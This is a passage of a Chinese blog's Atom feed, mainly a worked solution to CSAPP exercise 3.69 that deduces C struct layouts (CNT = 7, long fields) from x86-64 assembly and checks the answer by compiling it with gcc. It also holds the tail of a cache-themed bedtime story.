&lt;p&gt;一天，他看到有一个数据读，头也不回地跑到主存大声喊：“读来了！读来了！快缓存啊！”主存一收到数据读的信号，急忙把一块数据拿出来放到总线上，然后往L3、L2、L1层层缓存，边准备边喊：“不要怕，孩子，SRAM会帮</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    <category term="存储器" scheme="https://aucept.in/tags/%E5%AD%98%E5%82%A8%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 3.69</title>
    <link href="https://aucept.in/2025/05/13/CSAPP-3-69/"/>
    <id>https://aucept.in/2025/05/13/CSAPP-3-69/</id>
    <published>2025-05-13T11:20:00.000Z</published>
    <updated>2025-06-25T02:01:27.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p><img src="../image/CSAPP_3.69_1.png" alt="p1"></p>
<h2 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h2><p><strong><del>AT&amp;T快淘汰吧</del></strong></p>
<p>问题有两个，一个是确定每个b结构体里有几个a结构体，一个是确定a结构体的内容，即确定idx和x的类型，思路上就是看汇编算偏移量，去和已知的代码匹配</p>
<p>第3行的 add (%rsi), %ecx 明显对应着 bp-&gt;first + bp-&gt;last，所以第一行相当于告诉了 CNT个a结构体和first共占0x120 = 288字节，抛去int类型的first就是284字节</p>
<p>第4行用到了重要的参数i，存在rdi寄存器里，运算后rax = 5i</p>
<p>第5行 rax = rsi + 8 * rax 新的rax里存的是bp开始后的40i的地址，而i是a结构体数组的索引，所以每个a结构体占40字节</p>
<p>第6行 将rax的值+8移动到rdx，这个8字节的偏移显然是跳过idx，idx占8字节，是long类型</p>
<p>第8行 rax + rdx * 8 对应c代码第11行的x[ap-&gt;idx]。可以注意到ap-&gt;idx是作为索引的，所以可以猜测每个x占8个字节，也是long类型</p>
<p>到这里基本可以得出答案了，我们已经判断出idx和x都是long类型，接下来只需要改改未知的两个数组大小的参数，碰上0x120的大小即可</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CNT</span> <span class="token expression"><span class="token number">7</span></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> idx<span class="token punctuation">;</span>
    <span class="token keyword">long</span> x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> a_struct<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> first<span class="token punctuation">;</span>      <span class="token comment">// 4 字节</span>
    a_struct a<span class="token punctuation">[</span>CNT<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// CNT 个 a_struct</span>
    <span class="token keyword">int</span> last<span class="token punctuation">;</span>       <span class="token comment">// 4 字节</span>
    <span class="token punctuation">&#125;</span> b_struct<span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">long</span> i<span class="token punctuation">,</span> b_struct <span class="token operator">*</span>bp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">// 计算 n = bp->first + bp->last</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> bp<span class="token operator">-></span>first <span class="token operator">+</span> bp<span class="token operator">-></span>last<span class="token punctuation">;</span>

    <span class="token comment">// 获取 a[i] 的地址</span>
    a_struct <span class="token operator">*</span>ap <span class="token operator">=</span> <span class="token operator">&amp;</span>bp<span class="token operator">-></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 这里 ap 指向 a_struct 数组的第 i 个元素</span>

    <span class="token comment">// 将 n 存储到 a[i].x[idx] 中</span>
    ap<span class="token operator">-></span>x<span class="token punctuation">[</span>ap<span class="token operator">-></span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">;</span>  <span class="token comment">// idx 是 ap 中的 idx 字段，它是一个索引</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    b_struct <span class="token operator">*</span>bp <span class="token operator">=</span> new b_struct<span class="token punctuation">;</span>
    <span class="token function">test</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一个a结构体40字节，所以五个long类型，b结构体每个288字节，抛掉两个int的话是280字节，刚好是7*40，所以CNT = 7，汇编一下</p>
<p><code>gcc -S 3_69.cpp -o 3_69.s -O1</code></p>
<p>找出汇编代码的test函数部分</p>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">leaq    0(,%rdi,4), %rax
leaq(%rax,%rdi), %rdx
movq%rdx, %rax
addq8(%rsi,%rdx,8), %rax
movl288(%rsi), %edx
addl(%rsi), %edx
movslq%edx, %rdx
movq%rdx, 16(%rsi,%rax,8)
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>顺序稍有不同但关键的数字是吻合的，此题得解</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目：&quot;&gt;&lt;a href=&quot;#题目：&quot; class=&quot;headerlink&quot; title=&quot;题目：&quot;&gt;&lt;/a&gt;题目：&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;../image/CSAPP_3.69_1.png&quot; alt=&quot;p1&quot;&gt;&lt;/p&gt;
&lt;h2</summary>
        
      
    
    
    
    <category term="CSAPP" scheme="https://aucept.in/categories/CSAPP/"/>
    
    
    <category term="CSAPP" scheme="https://aucept.in/tags/CSAPP/"/>
    
    <category term="汇编" scheme="https://aucept.in/tags/%E6%B1%87%E7%BC%96/"/>
    
    <category term="逆向工程" scheme="https://aucept.in/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
</feed>
